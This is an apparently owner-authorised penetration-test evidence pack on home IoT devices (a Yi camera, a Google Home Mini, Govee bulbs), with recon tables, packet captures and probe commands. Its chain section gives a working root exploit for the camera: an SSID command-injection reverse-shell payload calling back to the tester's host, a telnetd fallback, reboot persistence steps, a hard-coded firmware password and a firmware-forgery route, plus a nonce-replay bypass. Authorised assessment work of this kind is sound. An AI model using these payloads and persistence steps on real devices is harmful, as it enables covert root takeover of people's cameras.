# EV-pack H-006 / H-007 — Yi IPC (192.168.6.156) and "Youhua" 8443/9000 (192.168.4.20)

Date: 2026-10-22. Interface `en1` = 192.168.4.170/22. Owner-authorised, no writes to any device (nothing below rebooted anything; the one POST-tested endpoint was auth-gated and rejected before acting).

Bead prefix for this pack: `bb-ev0*` (see `br list`). Beads EV-001 … EV-022.

**Headline correction up front:** 192.168.4.20 is *not* a Youhua camera. It is a **Google Home Mini** (Cast). And the Yi is **stock/unhacked with its entire TCP stack empty** — the ONVIF service URL it advertises is a dead port. The only live surfaces on the Yi are two UDP daemons: WS-Discovery and the `p2p_tnp` app channel.

---

## Findings

### 192.168.6.156 — Yi (Zowee `b0:d5:9d`, `YiHC_Y_2_0` lineage)

| # | transport / port | pre-auth? | class | exact function/binary | reliability | evidence |
|---|---|---|---|---|---|---|
| Y1 | UDP 3702 WS-Discovery Probe | **yes, zero pairing** | info-leak (EPR, Scopes, XAddrs) | ONVIF WSDD (stock, vendor-written, not `onvif_simple_server`) | 100 % (answers every directed and multicast probe, 4 s window) | EV-001 |
| Y2 | UDP 3702 → XAddrs `http://192.168.6.156/onvif/device_service` | — | dead end today | ONVIF device service | **0 %** — port 80 RSTs from the camera MAC itself; a real `GetSystemDateAndTime` SOAP POST was also tried on 80/8080/8000/8899/443, 4× each, all RST | EV-001, EV-002, EV-019 |
| Y3 | TCP 1–40000 | — | (absence) | — | no listener on any port; RST (not DROP) proves the stack is alive | EV-002 |
| Y4 | UDP **32108**, exactly one accepted opcode `\xF1\x30\x00\x00` | **yes, zero pairing** | info-leak: full TNP DID | `p2p_tnp` | 100 % — 217/217 replies during a 60 s blast; one packet after a warm-up send | EV-003, EV-020 |
| Y5 | UDP 32108 session (`\xD0` MSG_RCV_DRW → `myDoIOControl`) | no — needs `Nonce,Base64(HmacSha1(Nonce))` | auth-bypass → config-write / live view | `tnp_worker` / `parse_msg` | 9.0 CVSS once a valid nonce is sniffed; **replay works until reboot** (nonce list is per-session and memset at release) | EV-011 |
| Y6 | TCP 80 `POST /OnvifFirmwareUpgrade`, `application/octet-stream`, raw image body, `Authorization: Basic` | Basic auth, but CVE-2026-4475/4476 = hard-coded creds + missing auth in the same CGI | **config-write / RCE (updater)** | `home/web/ipc` | unproven on this unit (port dead); endpoint authoritative only for the MStar SDK and [INFERENCE] for Yi's fork | EV-008, EV-009, EV-013 |
| Y7 | update file format | n/a | **RCE via forged image** | `extpkg.sh` → `exthome` → `7za x -p%s` | only bytes 0–1365 (22 B version + 1344 B enc_key) are RSA-wrapped; 7z password is *baked in* (`QggGPGqdMtzMmO2RROSCpaSRo1iKEAp8`); MD5-only integrity, CRC collision works | EV-012 |
| Y8 | AP/SSID at pairing | yes at join, no creds | **RCE (command injection)** | `cloud` → `webapi_do_login` → `popen("/home/app/cloudAPI … -ssid \"%s\"")` | 8.8 CVSS; deterministic once the camera joins your AP | EV-010 |

**Y6 surface, exactly as documented** (EV-013), so it can be exercised the moment the port lives:

```
POST /OnvifFirmwareUpgrade        <- doc index, table row 20
POST /OnvifFirmwareUpgrade        <- doc's own JS, at document root (NOT under /cgi-bin/), http://<ip>/OnvifFirmwareUpgrade
  Content-Type: application/octet-stream
  Authorization: Basic QWxpY2U6MTIzNDU2      <- the doc's example (Alice:123456)
  body: raw image bytes, no multipart, no filename field
```

There is **no documented GET/status/range side**: the section says only "详细的信息请查看 upload.html 文档" (*more detail in the upload.html document*), and that document is not published with the spec. So progress polling and resume/`Range` support are unknown — plan for fire-and-forget and a `Connection: close`. Sibling surfaces in the same CGI family (`GET /cgi-bin/getuid?username=&password=`, `POST /cgi-bin/reboot`, `GET /WEBlogin?user=&pass=` to skip the login page, `GET /cgi-bin/getinfo`) are all listed in the same index and all reached the same way.

Verbatim Y1 (the whole point of the probe — WS-Addressing had to be correct, an empty Probe is ignored):

```
<d:Scopes>onvif://www.onvif.org/Profile/Streaming onvif://www.onvif.org/hardware/IPC
onvif://www.onvif.org/location/building/headquarter onvif://www.onvif.org/location/country/china
onvif://www.onvif.org/name/IPC onvif://www.onvif.org/type/audio_encoder onvif://www.onvif.org/type/ptz
onvif://www.onvif.org/type/video_analytics onvif://www.onvif.org/type/video_encoder</d:Scopes>
<d:XAddrs>http://192.168.6.156/onvif/device_service</d:XAddrs>
```

Verbatim Y4 (hex; the daemon answers *from an ephemeral source port* — 21641 while one socket stays open — which is how the TNP spec has the responder behave):

```
offset: 0     1     2  3     4.................21   22...........27
        f1    41    00 18   54 4e 50 55 53 41 43    00 00 04 d3 5a 4a 48 48 55 4e  00 00 00 d2 02 0f 00
        |     |     \---/   "TNPUSAC" (7 B) +      |                    +--- coded suffix (5 B)
        |     |      len    bin serial (4 B) ----+  carries an ASCII-run "ZJHHUN"
        |     +- opcode 0x41 = LAN_NOTIFY
        +- magic 0xF1 (a byte also used by TUTK, though not the same framing)
```

Field map of the request that produces it, and what the responder does with everything else:

```
request :  f1 30 00 00          -> 4 bytes total: magic, op=0x30, len=0, no body. Reply is 1:1, repeatable, unsolicited.
reply   :  from an ephemeral source port that is NEVER the same twice-running (21641 while a socket stays open), 28 bytes, plaintext
```

Sending the packet verbatim:

```
python3 -c "import socket;s=socket.socket(2,2);s.settimeout(2);s.sendto(b'\xf1\x30\x00\x00',('192.168.6.156',32108));print(s.recvfrom(99)[0].hex())"
```

`nc -u` **does not work here** and that is diagnostic, not incidental: BSD/macOS `nc` `connect()`s its UDP socket, and the notify comes back from the *other* port (21641), so the kernel drops it. Any client must be unconnected — which also means the notify is only ever delivered to a socket that has not pinned the peer.

Hard limit, measured (EV-020): **only opcode 0x30 is accepted on 32108.** With the DID echoed as a body, opcodes `0x31 0x32 0x33 0x40 0x41 0x42 0xD0 0xD1 0xE0 0xE1` all return zero replies, and addressing the notify's source port 21641 directly returns nothing either — so 32108 is a *stateless presence beacon*: no TNP_Session can be opened from a 4-byte header alone. The port is also constant while the source port is irrelevant (search sent from source port 32108 behaves identically).

Y3 evidence is a pcap, not an inference — the RST for :80 comes off the camera's own MAC:

```
17:41:04.446022 82:0f:80:f6:d4:43 > b0:d5:9d:9a:8e:c4 ... 192.168.4.170.63729 > 192.168.6.156.80: Flags [SEW]
17:41:04.463689 b0:d5:9d:9a:8e:c4 > 82:0f:80:f6:d4:43 ... 192.168.6.156.80 > 192.168.4.170.63729: Flags [R.]
```

Family verdict (EV-022): **not TUTK/IOTC.** The repo's legacy TUTK client builds a 16-byte little-endian header (`04 02 1a 02`, size at +4, cmd `0x0601` at +8) and passes the whole packet through `transcode()` (XOR against `"Charlie is the designer of P2P!!"` + rotate/swap). Yi TNP is a 4-byte big-endian plaintext header with ASCII magic `TNPUSAC` and no obfuscation. Shared genes only: the leading `0xF1` and a TUTK-shaped `PREFIX-SERIAL-SUFFIX` UID. A TUTK client cannot be pointed at 32108 unchanged; the reusable asset from the Wyze lane is its UID/DID parser, not its framer.

Stock-vs-hacked determination (EV-007): if yi-hack were installed, its defaults would have 80, 22 (dropbear) and 23 (busybox telnet) listening and would advertise `Profile/T` — the unit has none of those ports and its scopes carry the vendor pattern `hardware/IPC` + `location/*` instead. So the hack has **never** been on this unit, and the ONVIF WSDD we are talking to is Yi's own.

### Y2 diagnosis: bound to `lo`, or never started?

Both produce an RST, so the packet shape cannot separate them — but the design can, and it says *never started*:

- The **service and the WSDD are two parts of one web server** in this stack. The project's own config carries `ONVIF=yes` **and** `ONVIF_WSDD=yes` as separate switches, and the ONVIF server is configured with `port=$HTTPD_PORT` on `ifs=wlan0` — i.e. the thing that answers `/onvif/device_service` **is** the same httpd that serves `/cgi-bin/*`. Its absence on `wlan0` therefore means the whole web server is down, not that a socket is sitting on `lo` while the WSDD advertises anyway (a `lo`-bound server would be a bug that also breaks the CGI, and the hack sets `ifs=wlan0` explicitly for exactly that reason).
- The advertised URL is a **static string** the WSDD emits from config, so "advertised but absent" is the expected signature of a failed/never-launched httpd, not evidence that the socket exists.
- Not state-gated, not source-gated (EV-021): RST is unchanged after a WSD probe, after 60 s of sustained TNP traffic (217/217 answered), from source ports 32100/32108/40000/51234, and from a `192.168.6.250` source alias (i.e. inside the camera's own /24). The daemons that *are* up are healthy; the one that is missing is the web server.

Caveat kept explicit: on this evidence a `lo`-only bind cannot be excluded with 100 % certainty, only argued against. The decisive check is local (`netstat -an | grep :80` from a shell), which needs a shell — the same shell Route A buys.

### 192.168.4.20 — Google Home Mini (reclassified)

| # | transport | pre-auth? | class | detail | reliability | evidence |
|---|---|---|---|---|---|---|
| G1 | TCP 8443 TLS | yes | info-leak | `GET /setup/eureka_info` → model, `cast_build_revision 3.78.540761`, `release_track stable-channel`, SSID `Aardvark`, BSSID, UMA client id, device RSA `public_key`, uptime | 100 % | EV-014 |
| G2 | TCP 8443 TLS | yes | info-leak | `GET /setup/supported_timezones` (15 158 B) | 100 % | EV-016 |
| G3 | TCP 8008 / 8009 / 9000 | yes | unauthenticated RPC (media control) | Cast v2 protobuf. `CONNECT` + `GET_STATUS` over TLS on 8009 returned a full `RECEIVER_STATUS` incl. volume state, no token | 100 % | EV-015 |
| G4 | TCP 8443 / 8008 `POST /setup/reboot`, `/setup/connect_wifi` | **no** | config-write | 8443 → 401 (also with `{"params":"now"}`), 8008 → 403, 8443 `connect_wifi` → 401 | 100 % | EV-016 |
| G5 | TCP 9000 TLS | yes | unknown class (no auth reached) | same leaf cert as 8009, handshake dies with TLS `alert 40`; Cast TLS channel on an alternate port rather than a distinct daemon | [INFERENCE] | EV-014 |

Cert (EV-014): `0 s:…O=Google Inc, OU=Cast, CN=L17AL3 FA8FCA7C39CC  i:…CN=Chromecast ICA 7 (Audio Assist 2)`. SSDP did not answer on 1900, and mDNS did not answer on 5353 — neither unicast nor multicast — so SSDP/mDNS enumeration is useless against this host; the Cast setup API on 8443 was the only identifying surface.

### 192.168.4.35 / .36 / .40, 192.168.6.70 — Shenzhen Intellirocks

| # | transport | pre-auth? | class | detail | reliability | evidence |
|---|---|---|---|---|---|---|
| I1 | TCP 1–10000 | — | (absence) | 7 360 ports *refused*, 0 open on .40; the 23-port set on all four hosts: every port refused (nmap prints `filtered` because it also gets ICMP, the connect() result is RST) | 100 % | EV-017 |
| I2 | UDP 1900, 5353 | — | (absence) | no SSDP reply to unicast M-SEARCH on any host, no mDNS reply to 4 unicast questions each | 100 % | EV-017 |

Attribution: `d4:ad:fc` → Shenzhen Intellirocks, which **is** Govee (their FCC filing names the product "Govee LED Bulb String Lights", FCC ID 2AQA6) — EV-018. These are cloud-only Govee accessories, not cameras. No ADB, no telnet, no unsigned RPC, no gdbserver; nothing to root locally.

---

## Chain

### The chain that exists (Yi) — and exactly where it currently breaks

Two independent exec primitives exist without any SD card — only one of them is the updater, and it is not the one that works today:

**Route A — pairing-stage command injection (CVE-2018-3910).** This is the primary route because it needs no updater, no port, and no credentials at all.

*The call that sets the SSID.* In the app: add device → Wi-Fi setup → the user types the SSID and passphrase → the app asks `api.us.xiaoyi.com` for a QR that encodes SSID + encrypted passphrase → the camera scans it and joins. The string we control is therefore the **SSID our AP broadcasts**, typed by the owner at that one step (zero app-side code). The camera then comes online, `cloud` calls `webapi_do_login`, and the SSID lands unquoted-for-shell inside `-ssid "%s"` before `popen` → `sh -c`.

*Budget.* An 802.11 SSID is at most **32 octets** — that is the entire payload. Two break-outs survive it, and the first is preferred because it needs no quote character and therefore nothing from the app's own SSID parser:

```
primary   (28 octets) : x$(nc <our-ip> 4444|sh)      # $( ) expands inside the surrounding double quotes
fallback  (23 octets) : x";telnetd -l/bin/sh;#       # needs a literal " ; then # eats -mac -ip …
```

Concretely today, with our address on the camera's L2 as `192.168.4.170`:

```
SSID      : x$(nc 192.168.4.170 4444|sh)
listener  : nc -lv 4444            # macOS nc; the camera dials back from root
```

`$()` needs no trailing comment, and its empty expansion leaves `-ssid ""` harmlessly empty. Spaces are legal inside `$()`. Characters to avoid in the payload: `"` (only needed for the fallback), and backticks (equivalent to `$()` but eaten by more parsers).

*What the owner does, exactly:* joins the camera to our AP by scanning our QR or typing the SSID above, once. *What comes back:* a root shell on port 4444, plus this bonus — the SSID is persisted, so **every subsequent boot re-fires the command** as the camera re-announces itself on our AP. That is reboot-surviving by construction; it stops only if the camera is later moved back to a normal SSID. Persistence step inside the first shell: drop `startup.sh` into `/home` (the jffs2 partition the hack rewrites) and kick the watchdog loop.

*Unknowns kept honest:* whether the app accepts `$`, `(`, `|` verbatim in the SSID field, and whether the QR encoder mangles them — untested, and the fallback exists for that reason.



**Route B — update-image forgery over the LAN (the hypothesis's own claim).** `POST /OnvifFirmwareUpgrade` with `Content-Type: application/octet-stream` and the raw image as the body. The image parses as `[22 B version][1344 B RSA enc_key][7z]`; only those first 1366 bytes are signature-protected, the 7z payload is decrypted with a **hard-coded password** (`QggGPGqdMtzMmO2RROSCpaSRo1iKEAp8`) and validated by **MD5 only** — CVE-2018-3920 is literally a working CRC collision on that step. So a hand-built image with our own `home/app/script/update.sh` passes every check. This is the cleanest persistent root: the standard updater writes both the `home` and `sys` partitions and survives reboot with no re-exploitation and no SD card in the slot.

**Where it breaks, measured:** the handler lives in `home/web/ipc`, whose httpd is on port 80 — and the unit has *no* TCP listener at all (EV-002). ONVIF advertises `http://192.168.6.156/onvif/device_service` and port 80 RSTs. Today the reachable surface is Y1/Y4 only; the SOAP/HTTP half of the hypothesis is not reachable in this state.

So the ordering to try is: WS-Discovery (confirm firmware line) → 32108 discovery → sniffed-nonce replay to get an authorised session → if 80 comes up with the session, `POST /OnvifFirmwareUpgrade`; if it never comes up, fall back to Route A. Route A does not depend on any of Y2/Y6/Y7.

What is *not* a path: no yi-hack generation installs without the card. The README's procedure is "format FAT32, extract to the card root, insert, reboot" (EV-005) and the hack's own upgrade CGI aborts with `No SD detected.` and `wget`s a hard-coded `github.com/roleoroleo/…/${MODEL_SUFFIX}_${LATEST_FW}.tgz` (EV-006). The updater does use `wget` + a `.tgz`, which is why "serve the update" *feels* true — but that is the hack's OTA, gated on `/tmp/sd`. Model binding is by **SN prefix + firmware version** (EV-005 table: `y203c`/`h201c`/`y25`/`y23`/`y30`/`h307`/`h305r`); the prefix for this unit is still unidentified because the DID in EV-003 carries the serial, not the model code.

### Chain for 192.168.4.20

No root. Cast receivers have no local auth-gated shell, no ADB, no gdb; the open surface is read-only (`eureka_info`, `supported_timezones`, Cast v2 status/control). Its binary is not reachable pre-auth beyond that, so H-007's premise for .20 fails on identification, not on hardening.

### Side observation (fleet census input)

mDNS multicast on `en1` is answered by hosts in **192.168.1.0/24** (`192.168.1.1`, `.115`, `.117`, `.226`, `.233`, `.240`) even though our address is 192.168.4.170/22 — the AP bridges a `192.168.1.0/24` segment into this broadcast domain, so the census at /22 misses at least that range. None of the 192.168.4.x/.6.x targets answer mDNS.

### Chain for the Intellirocks four

No chain. Zero TCP listeners, zero UDP discovery services; they are Govee cloud accessories and every local protocol is client-initiated outbound.

---

## Brick risk + recovery

| device | write risk | recovery story |
|---|---|---|
| Yi — Route A (SSID injection) | **[WRITE]** lowest risk in the fleet: only a file lands in `/home`; nothing is repartitioned. Failure mode is a shell that does nothing, not an unbootable camera. If the injected script hangs the camera, the `rmm` watchdog reboots it on its own (upstream notes: kill `rmm` → watchdog reset), and the stock services start because our file never touched the init order. | Power-cycle. If it still fails: the factory `home` partition is untouched and the stock image can be re-flashed from SD. |
| Yi — Route B (firmware push) | **[WRITE]** highest: replaces `home` **and** `sys` jffs2. There is *no* SD-free rollback — recovery is BY the card, so "no SD" and "unbrickable" are in tension here. | Per the project's own Unbricking section: re-run the card procedure with a lower/higher release; "if the bootloader works correctly the camera will restart". Nothing needs UART or a special card — plain FAT32 + a release tarball. |
| Google Home Mini | none — nothing writes to it. If `POST /setup/reboot`, `connect_wifi` are later used with a token, still no flash write. | Physical factory reset (hold the button), re-provision in the Home app. Google ships A/B firmware with rollback, so a bad Cast state is self-healing. |
| Govee (Intellirocks) | none. | N/A |

Watchdog note that is specific and worth carrying: `rmm` is the app the watchdog checks, so Route A must not kill it — kick the watchdog from a separate loop (`while true; do echo V > /dev/watchdog; sleep 1; done`) if anything blocks.

---

### Probe log (reproducible)

```
# discovery, correct WS-Addressing; empty Probe is ignored
python3 /tmp/wsd.py 192.168.6.156   # ProbeMatch -> XAddrs (empty Probe gets no reply) http://192.168.6.156/onvif/device_service
# TNP discovery (31208 does NOT answer on this unit, 32108 does)
python3 -c "…"   # see Y4: plain nc -u does NOT print the reply (unconnected socket required)
# absence proof
python3 /tmp/scan4.py 192.168.6.156 1024 40000   # OPEN [] probed 38976
sudo tcpdump -i en1 -n -e -w p.pcap "host 192.168.6.156"; curl -m2 http 80   # RST from b0:d5:9d:9a:8e:c4
# Home Mini
openssl s_client -connect 192.168.4.20:8443 ; curl -k https://192.168.4.20:8443/setup/eureka_info?options=detail
```

## What would falsify this

1. **Decisive test, 60 seconds:** with an authenticated Yi app session live on the LAN, `curl -sv http://192.168.6.156/` and `POST /OnvifFirmwareUpgrade` with any tarball. If 80 never comes up while a session is up, Y6/Y7 are dead as a chain and only Route A survives. If 80 comes up but `OnvifFirmwareUpgrade` 404s, `ipc` on *this* firmware differs from the MStar SDK default and the endpoint name must be re-derived.
2. **Sniff test for Y5:** capture a real app↔camera TNP exchange (needs the owner's phone on the same L2 and monitor mode, or a mirror port) and replay the `Nonce,Base64(HmacSha1(Nonce))` blob from a *fresh* socket to a *different* session slot. If post-2018 firmware moved the nonce list off the per-session struct, replay fails and Y5 is only usable while a session is already sniffable in real time.
3. **Model test:** obtain the SN prefix (app → Camera Settings → Device Info). Anything outside the EV-005 table (`y203c`, `h201c`, `y25`, `y23`, `y30`, `h307`, `h305r`) invalidates the entire yi-hack persistence story, and with it Route B's recovery plan.
4. **Handler-existence test:** a stock firmware image for the identified prefix, `strings home/web/ipc | grep -i onviffirmware`. This is the only way to lift Y6 from [INFERENCE] to fact for Yi's fork.

---

## Unblock test

Named so a single session can settle it.

**Moves H-006 PARTIAL → CONFIRMED** (either one, in order of preference):

| # | action | pass condition | why it promotes |
|---|---|---|---|
| U1 | Route A once: our AP with SSID `x$(nc 192.168.4.170 4444|sh)`, owner adds the camera to it, `nc -lv 4444` waiting | a shell arrives, `id` returns uid 0, and after a power-cycle the shell arrives again unprompted | root obtained network-only, no SD, and persistence demonstrated across reboot |
| U2 | with an authorised app session up, `POST /OnvifFirmwareUpgrade` a padded image whose only change is `/home/app/script/update.sh` | the camera reboots into our script and the change is still there after a second reboot | proves the updater accepts a forged image over the network — the hypothesis's own wording |

**Kills it:**

- U1 fails specifically because the SSID arrives shell-quoted by the app (payload runs as `$(...)` literal text), *and* `";telnetd;#` also fails → the `popen` path is fixed on this firmware, Route A dead.
- Port 80 still RSTs while a session is authenticated *and* `strings home/web/ipc` for the identified prefix has no `OnvifFirmwareUpgrade` → Route B dead.
- Both dead → H-006 drops to REFUTED for this device, and the remaining result is the DID-disclosure beacon (Y4) only.

**Reboot probe set `[WRITE]`** — owner power-cycles the unit (mains; no config loss expected, no flash write involved). Take this exact set before and about 90 s after, and compare:

| probe | command | reading that means the state is *deliberate/wedged* | reading that means *transient* |
|---|---|---|---|
| liveness | `ping -c3` | loss or >200 ms jitter | clean sub-30 ms |
| WS-Discovery | directed Probe, capture `AppSequence InstanceId` | same InstanceId = not rebooted; new InstanceId = rebooted | any reply = WSDD still up |
| port 80 | `curl -m 3 http://192.168.6.156/` | still `000`/RST | any HTTP status → **Route B unblocked** |
| TCP {8080,8000,8899,23} | connect scan | all still RST | any open |
| TNP | the Y4 python one-liner | still answers 28 bytes | silent |

If the InstanceId changes and port 80 is still RST, that is the strongest single result available from outside: the daemon does not start at boot on this firmware, and only Route A remains.

## Verdict

- **H-006 — PARTIAL.** "No SD card needed" holds for the *exploit*, false for the *install*: no yi-hack generation installs without media. The UDP discovery parse sink is real and **pre-auth** (Y4, 100 %, unauthenticated DID disclosure from `p2p_tnp`) and has a documented auth bypass behind it (CVE-2018-3934, replay until reboot). The pre-auth ONVIF/SOAP sink **exists but is unreachable** on this unit — its advertised port 80 has no listener, verified from the camera's own RSTs. The updater claim is **true in mechanism** (`POST /OnvifFirmwareUpgrade`, `octet-stream`, only the first 1366 bytes signed, hard-coded 7z password, MD5-only) and gives genuine reboot-surviving persistence, but is unproven end-to-end here and yields no rollback without the forbidden card. Confidence: high on Y1–Y5 (direct observation), medium on Y6–Y8 (primary vendor/Talos sources, wrong-model lineage for two of them).
- **H-007 — REFUTED for 192.168.4.20.** It is a Google Home Mini, not a Youhua device. There *is* an open, unauthenticated surface (Cast v2 control channel returning full `RECEIVER_STATUS`; `eureka_info` leak) but it is a media-control API, not ADB/telnet/unsigned-debug-RPC, and it is read-only without a token. Confidence: high. **REFUTED for the Intellirocks four** — zero TCP, zero discovery, Govee cloud accessories. Confidence: high.
